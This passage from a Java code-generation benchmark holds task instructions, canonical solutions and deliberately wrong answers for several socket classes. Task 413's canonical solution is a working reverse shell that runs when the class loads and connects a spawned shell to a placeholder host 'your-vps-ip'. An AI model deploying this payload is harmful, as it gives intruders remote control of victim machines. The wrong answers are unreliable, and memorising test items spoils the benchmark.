    "Instruction": "Task Description: Create a Java class that establishes a TCP connection to a server, sends commands, and receives responses, including the ability to list files and receive image data from the server.\n\nClass Description: The DeviceConnection class manages a TCP socket connection to a server, providing methods to interact with the server by sending commands and processing responses. It handles both text-based communication and binary image data transfer, with optional ZIP compression support.\n\nAttributes:\n- socket: Socket - The TCP socket connection to the server\n- reader: Reader - Inner class for reading data from the server\n- writer: Writer - Inner class for writing data to the server\n- USE_ZIP: boolean - Flag indicating whether to use ZIP compression for image data\n\nMethods:\n- DeviceConnection() -> void - Constructor that establishes a connection to the server at localhost:4242\n- close() -> void - Closes the socket connection\n- listLayoutFiles() -> ArrayList<String> - Requests and returns a list of layout files from the server\n- takePicture() -> Image - Requests an image from the server and returns it as a BufferedImage\n- complete() -> void - Verifies the completion of a server operation\n- Reader(InputStream) -> void - Inner class constructor for reading data\n- nextLine() -> String - Reads a line of text from the server (Reader class method)\n- Writer(OutputStream) -> void - Inner class constructor for writing data\n- println(String) -> void - Writes a line of text to the server (Writer class method)",
    "Canonical_solution": "import java.awt.Image;\nimport java.awt.image.BufferedImage;\nimport java.io.*;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.IntBuffer;\nimport java.util.ArrayList;\nimport java.util.zip.ZipInputStream;\n\npublic class DeviceConnection {\n    private static final boolean USE_ZIP = true;\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n\n    public DeviceConnection() {\n        try {\n            socket = new Socket(\"localhost\", 4242);\n            reader = new Reader(socket.getInputStream());\n            writer = new Writer(socket.getOutputStream());\n        } catch (IOException e) {\n            System.err.println(\"Did you \\\"adb forward tcp:4242 tcp:4242\\\"\");\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public ArrayList<String> listLayoutFiles() {\n        ArrayList<String> files = new ArrayList<>();\n        if (writer == null) {\n            return files;\n        }\n        writer.println(\"LIST\");\n        boolean done = false;\n        while (!done) {\n            String response = reader.nextLine();\n            if (response.equals(\"DONE\")) {\n                done = true;\n            } else {\n                files.add(response);\n                System.out.println(\"Server response: \" + response);\n            }\n        }\n        return files;\n    }\n\n    public Image takePicture() {\n        writer.println(\"TAKE_PICTURE\");\n        String response = reader.nextLine();\n        int w = Integer.parseInt(response);\n        response = reader.nextLine();\n        int h = Integer.parseInt(response);\n        response = reader.nextLine();\n        int size = Integer.parseInt(response);\n        if (size == 0) {\n            complete();\n            return null;\n        }\n        byte[] bytes = new byte[size];\n        BufferedImage image = null;\n        try {\n            InputStream inputStream = reader.stream;\n            int offset = 0;\n            while (offset < size) {\n                int toRead = size - offset;\n                int read = inputStream.read(bytes, offset, toRead);\n                if (read > 0) {\n                    offset += read;\n                }\n            }\n            if (USE_ZIP) {\n                try {\n                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n                    ZipInputStream zipInputStream = new ZipInputStream(byteArrayInputStream);\n                    zipInputStream.getNextEntry();\n                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n                    byte[] buff = new byte[32768];\n                    int len = 0;\n                    while ((len = zipInputStream.read(buff)) > 0) {\n                        byteArrayOutputStream.write(buff, 0, len);\n                    }\n                    zipInputStream.closeEntry();\n                    zipInputStream.close();\n                    bytes = byteArrayOutputStream.toByteArray();\n                } catch(IOException e){\n                    e.printStackTrace();\n                }\n            }\n\n            image = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);\n            IntBuffer intBuffer = ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asIntBuffer();\n            int[] array = new int[intBuffer.remaining()];\n            intBuffer.get(array);\n            for (int i = 0; i < array.length; i++) {\n                int pixel = array[i];\n                int alpha = (pixel >> 24) & 0xff;\n                int red = (pixel >> 16) & 0xff;\n                int green = (pixel >> 8) & 0xff;\n                int blue = (pixel) & 0xff;\n                array[i] = (alpha << 24) + (blue << 16) + (green << 8) + red;\n            }\n            image.getRaster().setDataElements(0, 0, w, h, array);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        complete();\n        return image;\n    }\n\n    private class Reader {\n        DataInputStream stream;\n\n        Reader(InputStream stream) {\n            this.stream = new DataInputStream(stream);\n        }\n\n        String nextLine() {\n            try {\n                return stream.readUTF();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return \"\";\n        }\n    }\n\n    private class Writer {\n        DataOutputStream stream;\n\n        Writer(OutputStream stream) {\n            this.stream = new DataOutputStream(stream);\n        }\n\n        void println(String text) {\n            try {\n                stream.writeUTF(text);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void complete() {\n        String done = reader.nextLine();\n        if (!done.equals(\"DONE\")) {\n            System.out.println(\"WTF!!\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class DeviceConnection {\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n    private boolean USE_ZIP;\n\n    public DeviceConnection() {\n        try {\n            socket = new Socket(\"localhost\", 4242);\n            reader = new Reader(socket.getInputStream());\n            writer = new Writer(socket.getOutputStream());\n            USE_ZIP = false;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public ArrayList<String> listLayoutFiles() {\n        ArrayList<String> files = new ArrayList<>();\n        try {\n            writer.println(\"LIST_LAYOUT_FILES\");\n            complete();\n            String line;\n            while ((line = reader.nextLine()) != null && !line.isEmpty()) {\n                files.add(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return files;\n    }\n\n    public Image takePicture() {\n        try {\n            writer.println(\"TAKE_PICTURE\");\n            complete();\n            InputStream inputStream = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                byteArrayOutputStream.write(buffer, 0, bytesRead);\n            }\n            byte[] imageData = byteArrayOutputStream.toByteArray();\n            if (USE_ZIP) {\n                ByteArrayInputStream bais = new ByteArrayInputStream(imageData);\n                Inflater inflater = new Inflater();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] bufferDecompress = new byte[1024];\n                int len;\n                inflater.setInput(bais.toByteArray());\n                while (!inflater.finished()) {\n                    len = inflater.inflate(bufferDecompress);\n                    baos.write(bufferDecompress, 0, len);\n                }\n                inflater.end();\n                imageData = baos.toByteArray();\n            }\n            BufferedImage image = ImageIO.read(new ByteArrayInputStream(imageData));\n            return image;\n        } catch (IOException | IllegalArgumentException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void complete() {\n        try {\n            String line = reader.nextLine();\n            if (line == null || !line.equals(\"OK\")) {\n                throw new IOException(\"Server response not OK\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class Reader {\n        private BufferedReader bufferedReader;\n\n        Reader(InputStream inputStream) {\n            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        }\n\n        String nextLine() throws IOException {\n            return bufferedReader.readLine();\n        }\n    }\n\n    private class Writer {\n        private PrintWriter printWriter;\n\n        Writer(OutputStream outputStream) {\n            printWriter = new PrintWriter(outputStream, true);\n        }\n\n        void println(String line) {\n            printWriter.println(line);\n        }\n    }\n}"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a TCP client class in Java that establishes a connection to a server, handles bidirectional communication using object serialization, and manages various types of data frames for benchmarking purposes.\n\nClass Description: BinaryLinkClient is a TCP client implementation that connects to a benchmarking server, exchanging serialized data frames for coordinating benchmark execution, handling results, and managing output streams. It features thread-safe frame pushing, error handling, and resource management.\n\nAttributes:\n- lock: Object - Synchronization object for thread safety\n- clientSocket: Socket - TCP socket connection to the server\n- oos: ObjectOutputStream - Output stream for sending serialized objects\n- ois: ObjectInputStream - Input stream for receiving serialized objects\n- streamErr: ForwardingPrintStream - Error output stream that forwards to server\n- streamOut: ForwardingPrintStream - Standard output stream that forwards to server\n- outputFormat: OutputFormat - Proxy for formatting output frames\n- failed: boolean - Flag indicating connection failure state\n- resetToGo: int - Counter for periodic stream resets\n- delayedFrames: List<Serializable> - Buffer for frames during nested pushes\n- inFrame: boolean - Flag indicating ongoing frame transmission\n\nMethods:\n- BinaryLinkClient(String hostName, int hostPort) -> void - Constructor establishing connection to specified host:port\n- pushFrame(Serializable frame) -> void - Thread-safe method to send a serializable frame to server\n- readFrame() -> Object - Reads and returns the next frame from server\n- close() -> void - Closes all connections and streams\n- handshake() -> Options - Performs initial handshake with server, returns benchmark options\n- requestPlan() -> ActionPlan - Requests benchmark action plan from server\n- pushResults(IterationResult res) -> void - Sends benchmark results to server\n- pushException(BenchmarkException error) -> void - Sends benchmark exception to server\n- pushResultMetadata(BenchmarkResultMetaData res) -> void - Sends result metadata to server\n- getOutStream() -> PrintStream - Returns standard output stream\n- getErrStream() -> PrintStream - Returns error output stream\n- getOutputFormat() -> OutputFormat - Returns output format proxy\n\nInner Class:\n- ForwardingPrintStream - Custom PrintStream that forwards output to server as frames",
    "Canonical_solution": "import org.openjdk.jmh.runner.link.*;\nimport org.openjdk.jmh.runner.ActionPlan;\nimport org.openjdk.jmh.runner.BenchmarkException;\nimport org.openjdk.jmh.runner.format.OutputFormat;\nimport org.openjdk.jmh.runner.options.Options;\nimport org.openjdk.jmh.util.FileUtils;\nimport org.openjdk.jmh.util.Utils;\n\nimport java.io.*;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic final class BinaryLinkClient {\n\n    private static final int RESET_EACH = Integer.getInteger(\"jmh.link.resetEach\", 100);\n    private static final int BUFFER_SIZE = Integer.getInteger(\"jmh.link.bufferSize\", 64*1024);\n\n    private final Object lock;\n    private final Socket clientSocket;\n    private final ObjectOutputStream oos;\n    private final ObjectInputStream ois;\n    private final ForwardingPrintStream streamErr;\n    private final ForwardingPrintStream streamOut;\n    private final OutputFormat outputFormat;\n    private volatile boolean failed;\n    private int resetToGo;\n    private final List<Serializable> delayedFrames;\n    private boolean inFrame;\n\n    public BinaryLinkClient(String hostName, int hostPort) throws IOException {\n        this.lock = new Object();\n        this.clientSocket = new Socket(hostName, hostPort);\n        this.oos = new ObjectOutputStream(new BufferedOutputStream(clientSocket.getOutputStream(), BUFFER_SIZE));\n        this.oos.flush();\n        this.ois = new ObjectInputStream(new BufferedInputStream(clientSocket.getInputStream(), BUFFER_SIZE));\n        this.streamErr = new ForwardingPrintStream(OutputFrame.Type.ERR);\n        this.streamOut = new ForwardingPrintStream(OutputFrame.Type.OUT);\n        this.outputFormat = (OutputFormat) Proxy.newProxyInstance(\n                Thread.currentThread().getContextClassLoader(),\n                new Class[]{OutputFormat.class},\n                (proxy, method, args) -> {\n                    pushFrame(new OutputFormatFrame(ClassConventions.getMethodName(method), args));\n                    return null;\n                }\n        );\n        this.delayedFrames = new ArrayList<>();\n    }\n\n    private void pushFrame(Serializable frame) throws IOException {\n        if (failed) {\n            throw new IOException(\"Link had failed already\");\n        }\n\n        synchronized (lock) {\n            if (inFrame) {\n                delayedFrames.add(frame);\n                return;\n            }\n\n            try {\n                inFrame = true;\n\n                if (resetToGo-- < 0) {\n                    oos.reset();\n                    resetToGo = RESET_EACH;\n                }\n\n                oos.writeObject(frame);\n                oos.flush();\n\n                while (!delayedFrames.isEmpty()) {\n                    List<Serializable> frames = new ArrayList<>(delayedFrames);\n                    delayedFrames.clear();\n                    for (Serializable f : frames) {\n                        oos.writeObject(f);\n                    }\n                    oos.flush();\n                }\n            } catch (IOException e) {\n                failed = true;\n                throw e;\n            } finally {\n                inFrame = false;\n            }\n        }\n    }\n\n    private Object readFrame() throws IOException, ClassNotFoundException {\n        try {\n            return ois.readObject();\n        } catch (ClassNotFoundException | IOException ex) {\n            failed = true;\n            throw ex;\n        }\n    }\n\n    public void close() throws IOException {\n        FileUtils.safelyClose(streamErr);\n        FileUtils.safelyClose(streamOut);\n\n        synchronized (lock) {\n            oos.writeObject(new FinishingFrame());\n            FileUtils.safelyClose(ois);\n            FileUtils.safelyClose(oos);\n            clientSocket.close();\n        }\n    }\n\n    public Options handshake() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new HandshakeInitFrame(Utils.getPid()));\n            Object reply = readFrame();\n            if (reply instanceof HandshakeResponseFrame) {\n                return (((HandshakeResponseFrame) reply).getOpts());\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public ActionPlan requestPlan() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new InfraFrame(InfraFrame.Type.ACTION_PLAN_REQUEST));\n            Object reply = readFrame();\n            if (reply instanceof ActionPlanFrame) {\n                return ((ActionPlanFrame) reply).getActionPlan();\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public void pushResults(IterationResult res) throws IOException {\n        pushFrame(new ResultsFrame(res));\n    }\n\n    public void pushException(BenchmarkException error) throws IOException {\n        pushFrame(new ExceptionFrame(error));\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) throws IOException {\n        pushFrame(new ResultMetadataFrame(res));\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    class ForwardingPrintStream extends PrintStream {\n        public ForwardingPrintStream(final OutputFrame.Type type) {\n            super(new OutputStream() {\n                @Override\n                public void write(int b) throws IOException {\n                    pushFrame(new OutputFrame(type, new byte[]{(byte) (b & 0xFF)}));\n                }\n\n                @Override\n                public void write(byte[] b) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOf(b, b.length)));\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOfRange(b, off, len + off)));\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class BinaryLinkClient {\n    private final Object lock = new Object();\n    private Socket clientSocket;\n    private ObjectOutputStream oos;\n    private ObjectInputStream ois;\n    private ForwardingPrintStream streamErr;\n    private ForwardingPrintStream streamOut;\n    private OutputFormat outputFormat;\n    private boolean failed = false;\n    private int resetToGo = 0;\n    private List<Serializable> delayedFrames = new ArrayList<>();\n    private boolean inFrame = false;\n\n    public BinaryLinkClient(String hostName, int hostPort) {\n        try {\n            clientSocket = new Socket(hostName, hostPort);\n            oos = new ObjectOutputStream(clientSocket.getOutputStream());\n            ois = new ObjectInputStream(clientSocket.getInputStream());\n            streamOut = new ForwardingPrintStream(lock, oos);\n            streamErr = new ForwardingPrintStream(lock, oos);\n            System.setOut(streamOut);\n            System.setErr(streamErr);\n        } catch (IOException e) {\n            failed = true;\n        }\n    }\n\n    public void pushFrame(Serializable frame) {\n        synchronized (lock) {\n            if (failed) {\n                throw new IOException(\"Connection failed\");\n            }\n            if (inFrame) {\n                delayedFrames.add(frame);\n            } else {\n                inFrame = true;\n                try {\n                    oos.writeObject(frame);\n                    oos.flush();\n                } catch (IOException e) {\n                    failed = true;\n                }\n                for (Serializable f : delayedFrames) {\n                    try {\n                        oos.writeObject(f);\n                        oos.flush();\n                    } catch (IOException e) {\n                        failed = true;\n                    }\n                }\n                delayedFrames.clear();\n                inFrame = false;\n            }\n        }\n    }\n\n    public Object readFrame() {\n        synchronized (lock) {\n            if (failed) {\n                throw new IOException(\"Connection failed\");\n            }\n            try {\n                return ois.readObject();\n            } catch (IOException | ClassNotFoundException e) {\n                failed = true;\n                throw new IOException(\"Error reading frame\", e);\n            }\n        }\n    }\n\n    public void close() {\n        synchronized (lock) {\n            try {\n                if (clientSocket != null) clientSocket.close();\n                if (oos != null) oos.close();\n                if (ois != null) ois.close();\n            } catch (IOException e) {\n            }\n            failed = true;\n        }\n    }\n\n    public Options handshake() {\n        try {\n            pushFrame(new HandshakeRequest());\n            return (Options) readFrame();\n        } catch (Exception e) {\n            failed = true;\n            throw new RuntimeException(\"Handshake failed\", e);\n        }\n    }\n\n    public ActionPlan requestPlan() {\n        try {\n            pushFrame(new RequestPlan());\n            return (ActionPlan) readFrame();\n        } catch (Exception e) {\n            failed = true;\n            throw new RuntimeException(\"Request plan failed\", e);\n        }\n    }\n\n    public void pushResults(IterationResult res) {\n        pushFrame(res);\n    }\n\n    public void pushException(BenchmarkException error) {\n        pushFrame(error);\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) {\n        pushFrame(res);\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    private class ForwardingPrintStream extends PrintStream {\n        private final Object lock;\n        private final ObjectOutputStream oos;\n\n        public ForwardingPrintStream(Object lock, ObjectOutputStream oos) {\n            super(new PrintStream(new ByteArrayOutputStream()));\n            this.lock = lock;\n            this.oos = oos;\n        }\n\n        @Override\n        public void println(String x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(x);\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(String x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(x);\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println() {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(\"\");\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(char x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(char x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(boolean x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(boolean x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(int x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(int x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(long x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(long x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(float x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(float x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(double x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(double x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(char[] x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(new String(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(char[] x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(new String(x));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(String x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(x);\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(String x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(x);\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void print(Object x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(x.toString());\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void println(Object x) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(x.toString());\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(new String(b, off, len));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void write(int b) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(String.valueOf((char) b));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n\n        @Override\n        public void write(byte[] b) {\n            synchronized (lock) {\n                try {\n                    oos.writeObject(new String(b));\n                    oos.flush();\n                } catch (IOException e) {\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Create a Java class that establishes a reverse shell connection to a remote server using TCP protocol, with cross-platform compatibility for both Windows and Unix-like systems.\n\nClass Description: The JNDIObject class creates a reverse shell by spawning a local shell process (bash/sh on Unix, cmd.exe on Windows) and redirecting its input/output streams to a remote server via a TCP socket connection. The class includes platform detection logic to determine the appropriate shell to spawn.\n\nAttributes:\n- ip: String - The IP address of the remote server to connect to\n- port: String - The port number of the remote server to connect to\n- py_path: String - Path to Python interpreter (used for Unix-like systems)\n- cmd: String[] - The command array used to spawn the shell process\n\nMethods:\n- <static initializer>: () -> void - Automatically executes when the class is loaded, handles the entire reverse shell setup and connection process\n  - Detects operating system\n  - Finds appropriate shell or Python interpreter\n  - Spawns shell process\n  - Establishes socket connection\n  - Manages stream redirection between process and socket\n  - Handles cleanup on termination\n\nNote: The class uses a static initializer block rather than explicit methods to automatically execute its functionality when loaded. The implementation includes error handling and resource cleanup (closing sockets and destroying processes).",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class JNDIObject {\n    static {\n        try{\n            String ip = \"your-vps-ip\";\n            String port = \"443\";\n            String py_path = null;\n            String[] cmd;\n            if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"};\n                for(int i = 0; i < py_envs.length; ++i) {\n                    String py = py_envs[i];\n                    if ((new File(py)).exists()) {\n                        py_path = py;\n                        break;\n                    }\n                }\n                if (py_path != null) {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"};\n                    } else {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"};\n                    }\n                } else {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{\"/bin/bash\"};\n                    } else {\n                        cmd = new String[]{\"/bin/sh\"};\n                    }\n                }\n            } else {\n                cmd = new String[]{\"cmd.exe\"};\n            }\n            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();\n            Socket s = new Socket(ip, Integer.parseInt(port));\n            InputStream pi = p.getInputStream();\n            InputStream pe = p.getErrorStream();\n            InputStream si = s.getInputStream();\n            OutputStream po = p.getOutputStream();\n            OutputStream so = s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available() > 0) {\n                    so.write(pi.read());\n                }\n                while(pe.available() > 0) {\n                    so.write(pe.read());\n                }\n                while(si.available() > 0) {\n                    po.write(si.read());\n                }\n                so.flush();\n                po.flush();\n                Thread.sleep(50L);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {\n                }\n            }\n            p.destroy();\n            s.close();\n        }catch (Throwable e){\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class JNDIObject {\n    public static String ip;\n    public static String port;\n    public static String py_path;\n    public static String[] cmd;\n\n    static {\n        try {\n            String os = System.getProperty(\"os.name\").toLowerCase();\n            String shell;\n            if (os.contains(\"win\")) {\n                shell = \"cmd.exe\";\n            } else {\n                shell = \"/bin/bash\";\n            }\n\n            if (os.contains(\"win\")) {\n                cmd = new String[] { \"cmd.exe\", \"/c\", \"start\", \"cmd.exe\", \"/k\", \"cmd\" };\n            } else {\n                cmd = new String[] { \"bash\", \"-i\" };\n            }\n\n            Socket socket = new Socket(ip, Integer.parseInt(port));\n            Process process = Runtime.getRuntime().exec(cmd);\n\n            Thread inputThread = new Thread(() -> {\n                try (InputStream socketIn = socket.getInputStream(); OutputStream processOut = process.getOutputStream()) {\n                    byte[] buffer = new byte[1024];\n                    int len;\n                    while ((len = socketIn.read(buffer)) > 0) {\n                        processOut.write(buffer, 0, len);\n                        processOut.flush();\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n\n            Thread outputThread = new Thread(() -> {\n                try (OutputStream socketOut = socket.getOutputStream();\n                     InputStream processIn = process.getInputStream();\n                     InputStream processErr = process.getErrorStream()) {\n                    byte[] buffer = new byte[1024];\n                    int len;\n                    while ((len = processIn.read(buffer)) > 0) {\n                        socketOut.write(buffer, 0, len);\n                        socketOut.flush();\n                    }\n                    while ((len = processErr.read(buffer)) > 0) {\n                        socketOut.write(buffer, 0, len);\n                        socketOut.flush();\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n\n            inputThread.start();\n            outputThread.start();\n            inputThread.join();\n            outputThread.join();\n\n            socket.close();\n            process.destroy();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Create a Java class that handles TCP socket communication for receiving screen data from an Android device via minicap and forwarding it to a data queue for processing.\n\nClass Description: MiniCapInputSocketThread is a thread class that establishes a TCP connection to a local port forwarded from an Android device, continuously reads screen data from the minicap service, and places the data into a blocking queue for further processing by other components. It also manages resource cleanup when the connection is terminated.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and status information\n- iDevice: IDevice - The Android device being monitored\n- dataQueue: BlockingQueue<byte[]> - Queue for storing received screen data\n- miniCapPro: MiniCapLocalThread - The parent minicap process thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - The main Android test task thread\n- session: Session - WebSocket session associated with the screen streaming\n\nMethods:\n- MiniCapInputSocketThread(IDevice, BlockingQueue<byte[]>, MiniCapLocalThread, Session) -> None - Constructor that initializes the thread with device, data queue, minicap process, and session references\n- run() -> None - Main thread execution that establishes the socket connection, reads data continuously, and handles cleanup when finished",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\nimport static org.cloud.sonic.agent.tools.BytesTool.subByteArray;\n\npublic class MiniCapInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n\n    public final static String ANDROID_INPUT_SOCKET_PRE = \"android-minicap-input-socket-task-%s-%s-%s\";\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(ANDROID_INPUT_SOCKET_PRE));\n    }\n\n    @Override\n    public void run() {\n        int finalMiniCapPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, finalMiniCapPort, \"minicap\");\n        Socket capSocket = null;\n        InputStream inputStream = null;\n        try {\n            capSocket = new Socket(\"localhost\", finalMiniCapPort);\n            inputStream = capSocket.getInputStream();\n            int len = 1024;\n            while (miniCapPro.isAlive()) {\n                byte[] buffer = new byte[len];\n                int realLen;\n                realLen = inputStream.read(buffer);\n                if (buffer.length != realLen && realLen >= 0) {\n                    buffer = subByteArray(buffer, 0, realLen);\n                }\n                if (realLen >= 0) {\n                    dataQueue.offer(buffer);\n                }\n            }\n        } catch (IOException e) {\n            